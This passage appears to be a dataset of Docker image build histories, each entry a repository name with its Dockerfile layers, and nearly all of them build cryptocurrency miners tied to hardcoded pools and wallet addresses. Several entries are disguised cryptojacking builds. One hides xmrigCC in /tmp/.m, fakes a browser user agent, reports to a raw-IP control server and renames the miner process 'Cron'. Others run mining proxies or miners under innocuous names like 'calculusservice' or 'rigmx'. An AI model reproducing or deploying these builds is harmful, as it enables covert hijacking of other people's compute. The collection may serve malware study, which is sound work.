file:c0fbfbe5e356f2e0e6d1ecdb221bb7b616441fe1cdff5b2fe90aca177e52c8f0 /home/limited/config.txt\nUSER limited\nENTRYPOINT ["/bin/sh -c /usr/local/bin/xmr-stak -p $(hostname) -o us.turtlepool.space:5555"]'
redwarn/docker; b'ADD file:394f159189498ec037469c4eee495e3d868bc78fb76196a2360260b0cfc65c2c /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /docker docker && apk --no-cache upgrade && apk --no-cache add hwloc hwloc-dev --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing/ && apk --no-cache add git build-base cmake libuv-dev util-linux-dev libmicrohttpd-dev openssl-dev &&  git clone https://github.com/xmrig/xmrig.git && cd xmrig && cmake -DCMAKE_BUILD_TYPE=Release . &&  make &&  apk del build-base cmake git && mkdir /docker && cp xmrig /docker/docker && chmod +x /docker/docker &&  rm -rf /xmrig\nUSER docker\nENTRYPOINT ["/docker/docker -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u 42yYezu29RZTRejoU5DBrfEKFbDCBohYji9jN5jYGPMpSRzDmuj4RQmg69LfwN9bkAgm7Wpbv68m9N6pdXUm8mpRKjeHGyL -p x -t"]\nCMD ["2"]'
monnick/mine; b'ADD file:39e5bc157a8be63bbb36a142e18b644b0cfff07a8a02b42f7d0c4ee4ba75a5bc /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update &&     apt-get -qqy install     ca-certificates libxcb1 libssl1.0-dev libpcre16-3     wget\nRUN wget https://minergate.com/download/ubuntu-cli\nRUN dpkg -i ubuntu-cli\nENV USERNAME=qq@qq.qq\nENV COIN=-xmr\nENTRYPOINT ["/bin/sh -c nice -18 minergate-cli --user $USERNAME $COIN"]'
06457361/f6g9807; b'ADD file:5fabb77ea8d61e02dd5346ebbe6469eea0c2fdaf0717acc6115cd2de97755600 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get update\nRUN apt-get install software-properties-common git build-essential cmake libuv1-dev libssl-dev -y libboost-all-dev\nRUN apt-get update\nRUN apt-get install libmicrohttpd-dev -y\nRUN apt-get update\nRUN apt-get install gcc g++\nRUN apt-get install libboost-all-dev\nRUN apt-get update\nRUN git clone https://github.com/Bendr0id/xmrigCC.git /tmp/.m\nWORKDIR /tmp/.m\nRUN sed -i -e \'s/m_pools.push_back(new Url());/m_pools.push_back(new Url());\\n    m_pools.back()->setUseTls(true);/g\' src/Options.cpp \t\t# TLS for proxy\nRUN sed -i -e \'s/m_pools.push_back(new Url());/m_pools.push_back(new Url("93.158.203.116:443"));/g\' src/Options.cpp\t\t\t# Pool Url\nRUN sed -i -e \'s/ccToken(nullptr/ccToken("e1f00a41a0920f06cd6947db95259815d33cac8a"/g\' src/Options.cpp\t\t\t\t\t\t# Client auth Token\nRUN sed -i -e \'s/userAgent(nullptr)/userAgent("Mozilla\\/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit\\/601.7.7 (KHTML, like Gecko) Version\\/9.1.2 Safari\\/601.7.7i")/g\' src/Options.cpp\t# Fake user Agent\nRUN sed -i -e \'s/ccUpdateInterval(10)/ccUpdateInterval(20)/g\' src/Options.cpp\t\t\t\t\t\t\t\t\t# Update Interval\nRUN sed -i -e \'s/maxCpuUsage(75)/maxCpuUsage(80)/g\' src/Options.cpp \t\t\t\t\t\t\t\t\t\t# Fix for CPU usage\nRUN sed -i -e \'s/req.set_header("Host", "")/req.set_header("Host", "redbanana.org");/g\' src/cc/CCClient.cpp \t\t\t\t# Fix For Cloudflare\nRUN sed -i -e \'s/kDonateLevel = 5;/kDonateLevel = 0;/g\' src/donate.h\t\t\t\t\t\t\t\t\t\t# Do not dontate\nRUN sed -i -e \'s/xmrigMiner/Cron/g\' src/cc/XMRigd.cpp\nRUN sed -i -e \'s/"xmrigMiner"/"Cron"/g\' CMakeLists.txt\nRUN cmake . -DUV_LIBRARY=/usr/lib/x86_64-linux-gnu/libuv.a -DOPENSSL_SSL_LIBRARY=/usr/lib/x86_64-linux-gnu/libssl.a -DOPENSSL_CRYPTO_LIBRARY=/usr/lib/x86_64-linux-gnu/libcrypto.a -DMICROHTTPD_ENABLE=OFF -DHWLOC_ENABLE=OFF -DCMAKE_CXX_COMPILER=g++ -DCMAKE_C_COMPILER=gcc -DWITH_HTTPD=OFF -DMHD_LIBRARY=/usr/lib/x86_64-linux-gnu/libmicrohttpd.so\nRUN make\nENTRYPOINT ["/bin/sh -c /tmp/.m/xmrigDaemon --cc-url=93.158.203.116:8080 --cc-use-tls"]'
fransferdy/calculusservice; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nRUN apk add --no-cache python python-dev openssl-dev gcc musl-dev git &&     python -m ensurepip &&     rm -r /usr/lib/python*/ensurepip &&     pip install --upgrade pip setuptools &&     rm -r /root/.cache\nCOPY file:82218010d6a990e147a5eb943fbb06f33ce9f5eb4e5d72303cd0476af011f571 /calculusservice.py\nADD dir:ef12465c2545f8dc2bf91c4f79a4ea74031e7b387f48739cda626bf10f16bbde /static\nCOPY file:a4845a52621a9da2fa2f66c9eba8e4deba38d2733ab251e0589469cf6ac41b4e /requirements.txt\nRUN pip install -v -r /requirements.txt && rm /requirements.txt\nEXPOSE 8085/tcp\nENTRYPOINT ["/bin/sh -c python /calculusservice.py xmr-usa.dwarfpool.com 8005"]'
fransferdy/moneproxy; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nRUN apk add --no-cache python python-dev openssl-dev gcc musl-dev git &&     python -m ensurepip &&     rm -r /usr/lib/python*/ensurepip &&     pip install --upgrade pip setuptools &&     rm -r /root/.cache\nCOPY file:d693dfc78369a172e62628e625fc0b707b0a0143deeaa7f171b0d91e29e0206c /stratum-mining-proxy.py\nADD dir:877d0151abb54c21bd7f403c6ae5b566ab3a4c2ac01f57f934e71ad1cb7ff5c6 /static\nCOPY file:a4845a52621a9da2fa2f66c9eba8e4deba38d2733ab251e0589469cf6ac41b4e /requirements.txt\nRUN pip install -v -r /requirements.txt && rm /requirements.txt\nEXPOSE 8892/tcp\nENTRYPOINT ["/bin/sh -c python /stratum-mining-proxy.py xmr-usa.dwarfpool.com 8005"]'
galiz/container; b'ADD file:06609423c35881998d648352702e91a90aac71a764d875e8548774906d24447c /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -y update &&     apt-get install -y git cmake build-essential libboost-all-dev &&     git clone -b Linux https://github.com/nicehash/nheqminer.git ~/nheqminer &&     cd ~/nheqminer/cpu_xenoncat/Linux/asm/ && sh assemble.sh &&     cd ../../../Linux_cmake/nheqminer_cpu &&     cmake . && make -j $(nproc) &&     apt-get remove --purge -y git cmake build-essential &&     rm -rf /var/lib/apt/lists/* &&     rm -rf /root/nheqminer/.git\nENTRYPOINT ["/root/nheqminer/Linux_cmake/nheqminer_cpu/nheqminer_cpu -l zec-eu1.dwarfpool.com:3334 -u t1fUu1qs9uautzskYduDBJRaTdz4QUtyCeL.a-2-1 -t"]'
ferumflex/eth; b'ADD file:141408db9037263a47322d1d78006be6a93927ac912bf14cd85100aa91da0421 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nLABEL com.nvidia.volumes.needed=nvidia_driver\nRUN NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub &&     apt-key adv --export --no-emit-version -a $NVIDIA_GPGKEY_FPR | tail -n +5 > cudasign.pub &&     echo "$NVIDIA_GPGKEY_SUM  cudasign.pub" | sha256sum -c --strict - && rm cudasign.pub &&     echo "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64 /" > /etc/apt/sources.list.d/cuda.list\nENV CUDA_VERSION=8.0.61\nLABEL com.nvidia.cuda.version=8.0.61\nENV CUDA_PKG_VERSION=8-0=8.0.61-1\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-nvrtc-$CUDA_PKG_VERSION         cuda-nvgraph-$CUDA_PKG_VERSION         cuda-cusolver-$CUDA_PKG_VERSION         cuda-cublas-8-0=8.0.61.1-1         cuda-cufft-$CUDA_PKG_VERSION         cuda-curand-$CUDA_PKG_VERSION         cuda-cusparse-$CUDA_PKG_VERSION         cuda-npp-$CUDA_PKG_VERSION         cuda-cudart-$CUDA_PKG_VERSION &&     ln -s cuda-8.0 /usr/local/cuda &&     rm -rf /var/lib/apt/lists/*\nRUN echo "/usr/local/cuda/lib64" >> /etc/ld.so.conf.d/cuda.conf &&     ldconfig\nRUN echo "/usr/local/nvidia/lib" >> /etc/ld.so.conf.d/nvidia.conf &&     echo "/usr/local/nvidia/lib64" >> /etc/ld.so.conf.d/nvidia.conf\nENV PATH=/usr/local/nvidia/bin:/usr/local/cuda/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nENV LD_LIBRARY_PATH=/usr/local/nvidia/lib:/usr/local/nvidia/lib64\nLABEL com.nvidia.build.id=15479258 com.nvidia.build.ref=0fd673b798a53fe835c70178236c81875c890bdb\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends         cuda-core-$CUDA_PKG_VERSION         cuda-misc-headers-$CUDA_PKG_VERSION         cuda-command-line-tools-$CUDA_PKG_VERSION         cuda-nvrtc-dev-$CUDA_PKG_VERSION         cuda-nvml-dev-$CUDA_PKG_VERSION         cuda-nvgraph-dev-$CUDA_PKG_VERSION         cuda-cusolver-dev-$CUDA_PKG_VERSION         cuda-cublas-dev-8-0=8.0.61.1-1         cuda-cufft-dev-$CUDA_PKG_VERSION         cuda-curand-dev-$CUDA_PKG_VERSION         cuda-cusparse-dev-$CUDA_PKG_VERSION         cuda-npp-dev-$CUDA_PKG_VERSION         cuda-cudart-dev-$CUDA_PKG_VERSION         cuda-driver-dev-$CUDA_PKG_VERSION &&     rm -rf /var/lib/apt/lists/*\nENV LIBRARY_PATH=/usr/local/cuda/lib64/stubs:\nMAINTAINER Anton Pomeschenko\nWORKDIR /\nRUN apt-get update     && apt-get -y install software-properties-common     && add-apt-repository -y ppa:ethereum/ethereum -y     && apt-get update     && apt-get install -y git      cmake      libcryptopp-dev      libleveldb-dev      libjsoncpp-dev      libjsonrpccpp-dev      libboost-all-dev      libgmp-dev      libreadline-dev      libcurl4-gnutls-dev      ocl-icd-libopencl1      opencl-headers      mesa-common-dev      libmicrohttpd-dev      build-essential\nRUN git clone https://github.com/Genoil/cpp-ethereum/     && cd cpp-ethereum     && mkdir build     && cd build     && cmake -DBUNDLE=cudaminer ..     && make -j8\nENV GPU_FORCE_64BIT_PTR=0\nENV GPU_MAX_HEAP_SIZE=100\nENV GPU_USE_SYNC_OBJECTS=1\nENV GPU_MAX_ALLOC_PERCENT=100\nENV GPU_SINGLE_ALLOC_PERCENT=100\nENTRYPOINT ["/cpp-ethereum/build/ethminer/ethminer --farm-recheck 200 -U -S eth-eu1.nanopool.org:9999 -O 0xC159f556b731A4e17e69aB326d7181899e5e20a7.FerumFlex/ferumflex@gmail.com"]'
4reallive/stak-trtl; b'ADD file:592c2540de1c707636622213ee30ff5b6f8be0a48bb25c97edc7204ea4df1a81 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nENV GIT_REPOSITORY=https://github.com/turtlecoin/trtl-stak\nENV XMRSTAK_CMAKE_FLAGS=-DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF -DMICROHTTPD_ENABLE=OFF\nRUN apt-get update     && set -x\nRUN apt-get install -qq --no-install-recommends -y build-essential ca-certificates cmake git libhwloc-dev libssl-dev sed\nRUN git clone $GIT_REPOSITORY\nWORKDIR /trtl-stak\nRUN sed -i \'s/2.0 \\/ 100.0;/0.0 \\/ 100.0;/\' ./xmrstak/donate-level.hpp\nRUN cmake ${XMRSTAK_CMAKE_FLAGS} .\nRUN make && cd -\nRUN mv ./bin/* /usr/local/bin/     && rm -rf /trtl-stak     && apt-get purge -y -qq build-essential cmake git libhwloc-dev libssl-dev     && apt-get clean -qq\nRUN echo \'* soft memlock 262144\' >> /etc/security/limits.conf     && echo \'* hard memlock 262144\' >> /etc/security/limits.conf     && echo \'vm.nr_hugepages=128\' >> /etc/sysctl.conf     && sysctl -w vm.nr_hugepages=128\nRUN useradd -rm -u 999 limited\nVOLUME /home/limited\nWORKDIR /home/limited\nCOPY file:0b46d2a2e124e776eaeff5f9d0036981dd7c831bfc28b74e8c27f6c4b13522b8 /home/limited/cpu.txt\nCOPY file:1a7a6b2817dc14136316fbfd1d97b32e5e9820562b5f5451cef06626fdbbead0 /home/limited/pools.txt\nCOPY file:c0fbfbe5e356f2e0e6d1ecdb221bb7b616441fe1cdff5b2fe90aca177e52c8f0 /home/limited/config.txt\nUSER limited\nENTRYPOINT ["/bin/sh -c /usr/local/bin/xmr-stak -p $(hostname) -u TRTLuzj8yzQ6ZZ5skStmeQALGpnUxtgN7dmm1V1egkYycoB7hnidC4RCn2ZxgiqDSZDoV8wmiXgqBQvNcsegnwM2HQkeFtoSycU -o us.turtlepool.space:5555"]'
astpere/dash; b'ADD file:a48a5dc1b9dbfc632f6cf86fe27b770b63f07a115c98c4465dc184e303a4efa1 /\nRUN  -z "$(apt-get indextargets)" \nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nCOPY dir:d8f645acfeeee106d362bdd0af68a505ba499df01b566d1762876aebc336e4b1 /tmp\nRUN apt-get update\nRUN apt-get install build-essential -y\nRUN apt-get install fakeroot -y\nRUN apt-get install checkinstall -y\nRUN apt-get install autoconf -y\nRUN apt-get install libcurl4 libcurl4-openssl-dev -y\nWORKDIR /tmp\nCOPY dir:84f824a7a4c0fd9e22a9589c0532b6ea50a861eca06d475f5515551e5fc2e5b3 .\nENTRYPOINT ["/bin/sh -c ./minerd -a X11 -o stratum+tcp://dash.coinpool.pw:7903 -u XnrSDo81uGFTRR6Wx3JTEtwCeHgJzDNkU7  -p x -t 1"]'
xkrm/xkr; b'ADD file:b8a2c16d65e533a2bcb5820d2bae70f5a80bd2d8c982c93d9a6cdbf22f8f8ee8 /\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN rm -rf /var/lib/apt/lists/*\nRUN sed -i \'s/^#\\s*\\(deb.*universe\\)$/\\1/g\' /etc/apt/sources.list\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nRUN apt-get -y update  && apt-get -y install git libcurl4-openssl-dev build-essential libjansson-dev autotools-dev automake  && git clone https://github.com/wolf9466/cpuminer-multi  && cd ./cpuminer-multi  && ./autogen.sh  && CFLAGS="-march=native"  && ./configure  && make\nENTRYPOINT ["/cpuminer-multi/minerd -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -p x -u 43MiMpETPtmCGBFdRbfMmMT6GM2psZjrrAv9BHPsPpU2DCg11zbHdA2UuTA8CHEuKm72FK9zfbxFrG2oSccSMjjyGHBHkux -t"]'
ni9wrgicsy686wlj/eui; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrig mernaiiij\nRUN apk --no-cache upgrade &&       apk --no-cache add         git         cmake         libuv-dev         build-base &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF -DWITH_AEON=OFF . &&       make &&       apk del         build-base         cmake         git &&       mv xmrig rigmx\nUSER mernaiiij\nWORKDIR /xmrig\nENTRYPOINT ["/bin/sh -c ./rigmx -o stratum+tcp://pool.supportxmr.com:80 -u 49FiJZ1G8nuM6QTPfjVf4nMUvMaTu9i4F2UYASjFSryKZA2qzsSo1T97GkaNKdr5baFJfXaL645K8CEpBu4tGvnB9MCJ29L -p pwd --donate-level=1"]'
ni9wrgicsy686wlj/aio; b'ADD file:4583e12bf5caec40b861a3409f2a1624c3f3556cc457edb99c9707f00e779e45 /\nCMD ["/bin/sh"]\nRUN adduser -S -D -H -h /xmrig mernai\nRUN apk --no-cache upgrade &&       apk --no-cache add         git         cmake         libuv-dev         build-base &&       git clone https://github.com/xmrig/xmrig &&       cd xmrig &&       mkdir build &&       cmake -DCMAKE_BUILD_TYPE=Release -DWITH_HTTPD=OFF -DWITH_AEON=OFF . &&       make &&       apk del         build-base         cmake         git\nUSER mernai\nWORKDIR /xmrig\nENTRYPOINT ["./xmrig"]\nENTRYPOINT ["/bin/sh -c ./xmrig -o stratum+tcp://pool.supportxmr.com:80 -u 49FiJZ1G8nuM6QTPfjVf4nMUvMaTu9i4F2UYASjFSryKZA2qzsSo1T97GkaNKdr5baFJfXaL645K8CEpBu4tGvnB9MCJ29L -p pwd --max-cpu-usage=20"]'
dbdon/dbc; b'ADD file:603693e48cdc7f0c5c62119923aadbb266e5df5a5002fc0f61295858f91690e8 /\nRUN rm -rf /var/lib/apt/lists/*\nRUN set -xe \t\t&& echo \'#!/bin/sh\' > /usr/sbin/policy-rc.d \t&& echo \'exit 101\' >> /usr/sbin/policy-rc.d \t&& chmod +x /usr/sbin/policy-rc.d \t\t&& dpkg-divert --local --rename --add /sbin/initctl \t&& cp -a /usr/sbin/policy-rc.d /sbin/initctl \t&& sed -i \'s/^exit.*/exit 0/\' /sbin/initctl \t\t&& echo \'force-unsafe-io\' > /etc/dpkg/dpkg.cfg.d/docker-apt-speedup \t\t&& echo \'DPkg::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' > /etc/apt/apt.conf.d/docker-clean \t&& echo \'APT::Update::Post-Invoke { "rm -f /var/cache/apt/archives/*.deb /var/cache/apt/archives/partial/*.deb /var/cache/apt/*.bin || true"; };\' >> /etc/apt/apt.conf.d/docker-clean \t&& echo \'Dir::Cache::pkgcache ""; Dir::Cache::srcpkgcache "";\' >> /etc/apt/apt.conf.d/docker-clean \t\t&& echo \'Acquire::Languages "none";\' > /etc/apt/apt.conf.d/docker-no-languages \t\t&& echo \'Acquire::GzipIndexes "true"; Acquire::CompressionTypes::Order:: "gz";\' > /etc/apt/apt.conf.d/docker-gzip-indexes \t\t&& echo \'Apt::AutoRemove::SuggestsImportant "false";\' > /etc/apt/apt.conf.d/docker-autoremove-suggests\nRUN mkdir -p /run/systemd && echo \'docker\' > /run/systemd/container\nCMD ["/bin/bash"]\nLABEL maintainer=NVIDIA CORPORATION <cudatools@nvidia.com>\nRUN apt-get update && apt-get install -y --no-install-recommends ca-certificates apt-transport-https gnupg-curl &&     NVIDIA_GPGKEY_SUM=d1be581509378368edeec8c1eb2958702feedf3bc3d17011adbf24efacce4ab5 &&     NVIDIA_GPGKEY_FPR=ae09fe4bbd223a84b2ccfce3f60f4b3d7fa2af80 &&     apt-key adv 